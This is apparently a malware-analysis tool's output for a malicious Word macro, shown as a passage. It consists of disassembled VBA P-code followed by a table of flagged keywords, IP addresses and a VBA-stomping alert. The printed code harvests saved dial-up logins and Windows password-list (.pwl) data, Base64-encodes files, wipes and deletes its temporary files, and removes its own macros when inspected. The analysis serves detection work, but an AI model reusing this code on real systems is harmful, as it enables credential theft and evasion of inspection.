' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #164:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #165:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #166:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #167:
' 	ArgsCall DoEvents 0x0000 
' Line #168:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #169:
' 	ExitSub 
' Line #170:
' 	EndSelect 
' Line #171:
' 	CaseElse 
' Line #172:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #173:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #174:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #175:
' 	EndSelect 
' Line #176:
' 	StartForVariable 
' 	Next 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Function Chkip())
' Line #180:
' 	Dim 
' 	VarDefn hWnd (As Long)
' Line #181:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #182:
' 	Dim 
' 	VarDefn A (As Long)
' Line #183:
' 	Dim 
' 	VarDefn i (As Long)
' Line #184:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #185:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	Ld Friend 
' 	St NF 
' Line #188:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #189:
' 	Ld NF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "route print > c:\windows\chkip.bmp"
' 	PrintItemNL 
' Line #190:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #191:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #192:
' 	Ld Timer 
' 	St Start 
' Line #193:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0018 "(Сеанс завершен) - chkip"
' 	ArgsLd FindWindow 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	DoWhile 
' Line #194:
' 	ArgsCall DoEvents 0x0000 
' Line #195:
' 	Ld Timer 
' 	Ld Start 
' 	LitDI2 0x000A 
' 	Add 
' 	Gt 
' 	IfBlock 
' Line #196:
' 	ExitFunc 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	Loop 
' Line #199:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0018 "(Сеанс завершен) - chkip"
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd 
' Line #200:
' 	Ld hWnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #201:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	ArgsLd FileLen 0x0001 
' 	St Chkip 
' Line #202:
' 	LitDI2 0x00FF 
' 	St A 
' Line #203:
' 	Ld Friend 
' 	St NF 
' Line #204:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #205:
' 	Ld Friend 
' 	St NF1 
' Line #206:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #207:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #208:
' 	Ld NF 
' 	Sharp 
' 	Ld i 
' 	Ld A 
' 	PutRec 
' Line #209:
' 	StartForVariable 
' 	Next 
' Line #210:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF1 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #211:
' 	Ld NF1 
' 	Sharp 
' 	Ld i 
' 	Ld A 
' 	PutRec 
' Line #212:
' 	StartForVariable 
' 	Next 
' Line #213:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #214:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #215:
' 	LitStr 0x0014 "c:\windows\chkip.bat"
' 	ArgsCall Kill 0x0001 
' Line #216:
' 	LitStr 0x0014 "c:\windows\chkip.bmp"
' 	ArgsCall Kill 0x0001 
' Line #217:
' 	EndFunc 
' Line #218:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #219:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #220:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #221:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #222:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #223:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #224:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #225:
' 	StartForVariable 
' 	Next 
' Line #226:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #227:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #228:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #229:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #230:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #231:
' 	StartForVariable 
' 	Next 
' Line #232:
' Line #233:
' 	EndFunc 
' Line #234:
' 	FuncDefn (Sub Filler(MessStr As String, hWnd As Long))
' Line #235:
' 	Dim 
' 	VarDefn i (As Long)
' Line #236:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #237:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #238:
' 	OnError (Resume Next) 
' Line #239:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #240:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #241:
' 	Ld Tmp 
' 	SelectCase 
' Line #242:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #243:
' 	ArgsCall DoEvents 0x0000 
' Line #244:
' 	Ld hWnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #245:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #246:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #247:
' 	CaseElse 
' Line #248:
' 	Ld hWnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #249:
' 	EndSelect 
' Line #250:
' 	StartForVariable 
' 	Next 
' Line #251:
' 	EndSub 
' Line #252:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #253:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #254:
' 	Ld Timer 
' 	St Start 
' Line #255:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #256:
' 	ArgsCall DoEvents 0x0000 
' Line #257:
' 	Loop 
' Line #258:
' 	EndSub 
' Line #259:
' 	FuncDefn (Function Grab(New As String))
' Line #260:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #261:
' 	Dim 
' 	VarDefn AZ (As String)
' Line #262:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #263:
' 	Dim 
' 	VarDefn Num (As Integer)
' Line #264:
' 	Dim 
' 	VarDefn PwdLst (As String)
' Line #265:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #266:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #267:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #268:
' 	Dim 
' 	VarDefn NF1 (As Integer)
' Line #269:
' 	LitStr 0x001A "abcdifghijklmnopqastuvwxyz"
' 	St AZ 
' Line #270:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #271:
' 	LitDI2 0x0019 
' 	ArgsLd Random1 0x0001 
' 	St Num 
' Line #272:
' 	Ld New 
' 	Ld AZ 
' 	Ld Num 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St New 
' Line #273:
' 	StartForVariable 
' 	Next 
' Line #274:
' 	Ld New 
' 	LitStr 0x0004 ".egn"
' 	Add 
' 	St New 
' Line #275:
' 	OnError (Resume Next) 
' Line #276:
' 	Ld Friend 
' 	St NF 
' Line #277:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #278:
' 	Ld Friend 
' 	St NF1 
' Line #279:
' 	LitStr 0x000B "c:\windows\"
' 	Ld New 
' 	Add 
' 	Ld NF1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #280:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #281:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #282:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #283:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld Tmp 
' 	PrintItemNL 
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	Loop 
' Line #286:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #287:
' 	Ld Friend 
' 	St NF 
' Line #288:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #289:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #290:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #291:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #292:
' 	Ld Temp 
' 	LitStr 0x0010 "[Password Lists]"
' 	Eq 
' 	IfBlock 
' Line #293:
' 	Ld Temp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #294:
' 	Ld NF 
' 	Ld Temp 
' 	LineInput 
' Line #295:
' 	Ld PwdLst 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Temp 
' 	Add 
' 	St PwdLst 
' Line #296:
' 	Loop 
' Line #297:
' 	ExitDo 
' Line #298:
' 	EndIfBlock 
' Line #299:
' 	Ld Counter 
' 	LitDI2 0x0014 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #300:
' 	ArgsCall DoEvents 0x0000 
' Line #301:
' 	EndIfBlock 
' Line #302:
' 	Loop 
' Line #303:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #304:
' 	Ld NF1 
' 	Sharp 
' 	PrintChan 
' 	Ld PwdLst 
' 	PrintItemNL 
' Line #305:
' 	Ld NF1 
' 	Sharp 
' 	Close 0x0001 
' Line #306:
' 	EndFunc 
' Line #307:
' 	FuncDefn (Function Base64(FName As String))
' Line #308:
' 	Dim 
' 	VarDefn i (As Long)
' Line #309:
' 	Dim 
' 	VarDefn ABC (As String)
' Line #310:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #311:
' 	Dim 
' 	VarDefn Char (As Byte)
' Line #312:
' 	Dim 
' 	VarDefn Cod (As Integer)
' Line #313:
' 	Dim 
' 	VarDefn Roll (As Integer)
' Line #314:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #315:
' 	QuoteRem 0x0000 0x0000 ""
' Line #316:
' 	Dim 
' 	VarDefn HMask (As Integer)
' Line #317:
' 	Dim 
' 	VarDefn LMask (As Integer)
' Line #318:
' 	Dim 
' 	VarDefn Shift (As Integer)
' Line #319:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #320:
' Line #321:
' Line #322:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #323:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #324:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #325:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #326:
' 	LitDI2 0x0001 
' 	St Counter 
' Line #327:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St ABC 
' Line #328:
' 	Ld Friend 
' 	St NF 
' Line #329:
' 	OnError (Resume Next) 
' Line #330:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FName 
' 	Add 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #331:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NF 
' 	ArgsLd LOF 0x0001 
' 	For 
' Line #332:
' 	Ld NF 
' 	Sharp 
' 	Ld Counter 
' 	Ld Char 
' 	GetRec 
' Line #333:
' 	Ld Char 
' 	Ld HMask 
' 	And 
' 	Paren 
' 	Ld LMask 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	IDiv 
' 	Paren 
' 	Ld Roll 
' 	Or 
' 	St Cod 
' Line #334:
' 	Ld Char 
' 	Ld LMask 
' 	And 
' 	Paren 
' 	Ld Shift 
' 	Mul 
' 	St Roll 
' Line #335:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Cod 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #336:
' 	Ld HMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x00FF 
' 	And 
' 	St HMask 
' Line #337:
' 	Ld LMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	St LMask 
' Line #338:
' 	Ld Shift 
' 	LitDI2 0x0004 
' 	IDiv 
' 	St Shift 
' Line #339:
' 	Ld HMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #340:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #341:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #342:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #343:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #344:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #345:
' 	EndIfBlock 
' Line #346:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #347:
' 	StartForVariable 
' 	Next 
' Line #348:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #349:
' 	Ld Shift 
' 	LitDI2 0x0010 
' 	Lt 
' 	IfBlock 
' Line #350:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #351:
' 	EndIfBlock 
' Line #352:
' 	Ld Tmp 
' 	FnLen 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	St Cod 
' Line #353:
' 	Ld Cod 
' 	IfBlock 
' Line #354:
' 	Ld Tmp 
' 	LitDI2 0x0004 
' 	Ld Cod 
' 	Sub 
' 	LitStr 0x0001 "="
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	St Tmp 
' Line #355:
' 	EndIfBlock 
' Line #356:
' 	Ld Tmp 
' 	St Base64 
' Line #357:
' 	EndFunc 
' Line #358:
' 	FuncDefn (Function FindPWL(j As Integer, FindFiles As ))
' Line #359:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #360:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #361:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #362:
' 	ExitFunc 
' Line #363:
' 	EndIfBlock 
' Line #364:
' 	LitDI2 0x0000 
' 	St j 
' Line #365:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #366:
' 	Ld Dir 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #367:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #368:
' 	Loop 
' Line #369:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #370:
' 	LitDI2 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #371:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #372:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #373:
' 	Ld Dir$ 
' 	Ld j 
' 	ArgsSt FindFiles 0x0001 
' Line #374:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #375:
' 	ElseBlock 
' Line #376:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #377:
' 	EndIfBlock 
' Line #378:
' 	EndFunc 
' Line #379:
' 	FuncDefn (Function Adapt(Cod As String))
' Line #380:
' 	Dim 
' 	VarDefn PostCod (As String)
' Line #381:
' 	Dim 
' 	VarDefn i (As Long)
' Line #382:
' 	OnError (Resume Next) 
' Line #383:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #384:
' 	Ld i 
' 	LitDI2 0x004C 
' 	Ge 
' 	Ld i 
' 	LitDI2 0x004C 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #385:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St PostCod 
' Line #386:
' 	ElseBlock 
' Line #387:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St PostCod 
' Line #388:
' 	EndIfBlock 
' Line #389:
' 	StartForVariable 
' 	Next 
' Line #390:
' 	LitStr 0x0001 "#"
' 	Ld PostCod 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Adapt 
' Line #391:
' 	EndFunc 
' Line #392:
' 	FuncDefn (Function Random1(i As Integer))
' Line #393:
' 	Dim 
' 	VarDefn Resalt (As Integer)
' Line #394:
' 	Ld i 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Resalt 
' Line #395:
' 	Ld Resalt 
' 	St Random1 
' Line #396:
' 	EndFunc 
' Line #397:
' 	FuncDefn (Sub ViewVBCode())
' Line #398:
' 	ArgsCall Deleter 0x0000 
' Line #399:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #400:
' 	EndSub 
' Line #401:
' 	FuncDefn (Sub ToolsMacro())
' Line #402:
' 	ArgsCall Deleter 0x0000 
' Line #403:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #404:
' 	EndSub 
' Line #405:
' 	FuncDefn (Sub Deleter())
' Line #406:
' 	Dim 
' 	VarDefn TempPath (As String)
' 	VarDefn TempName (As String)
' Line #407:
' 	Dim 
' 	VarDefn Docum (As Object)
' Line #408:
' 	Dim 
' 	VarDefn VBComp (As Object)
' Line #409:
' 	OnError (Resume Next) 
' Line #410:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #411:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #412:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #413:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #414:
' 	EndWith 
' Line #415:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #416:
' 	EndIfBlock 
' Line #417:
' 	StartForVariable 
' 	Next 
' Line #418:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #419:
' 	Debug 
' 	PrintObj 
' 	Ld VBComp 
' 	MemLd New 
' 	PrintItemNL 
' Line #420:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #421:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #422:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #423:
' 	EndWith 
' Line #424:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #425:
' 	EndIfBlock 
' Line #426:
' 	StartForVariable 
' 	Next 
' Line #427:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #428:
' 	EndSub 
' Line #429:
' 	FuncDefn (Sub ToolsOptions())
' Line #430:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #431:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #432:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #433:
' 	EndWith 
' Line #434:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #435:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #436:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #437:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #438:
' 	EndWith 
' Line #439:
' 	EndSub 
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |194.67.1.159        |IPv4 address                                 |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |chkip.bat           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

